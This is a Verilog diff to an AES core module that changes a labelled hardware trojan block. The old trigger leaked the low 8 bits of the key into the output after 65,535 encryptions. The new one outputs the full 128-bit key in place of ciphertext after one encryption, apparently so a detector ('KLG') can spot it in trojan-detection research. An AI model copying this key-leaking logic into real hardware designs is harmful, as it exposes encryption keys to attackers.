@@ -160,12 +160,12 @@ module aes_core(
   assign ready        = ready_reg;
 
   // ====== TROJAN BEGIN: T02_p2_slow_leak ======
-  // Trigger: bo dem dat nguong 2^16 lan ma hoa
-  assign trojan_trig = (encrypt_counter >= 16'hFFFF);
+  // Trigger: sau 1 encryption (counter >= 1)
+  assign trojan_trig = (encrypt_counter >= 16'h0001);
 
-  // Payload: ro 8 bit thap cua khoa vao result[7:0]
+  // Payload: output key thay vi ciphertext de KLG phat hien
   assign result = trojan_trig
-                  ? {muxed_new_block[127:8], key[7:0]}
+                  ? key[127:0]
                   : muxed_new_block;
   // ===== TROJAN END: T02_p2_slow_leak ======
 
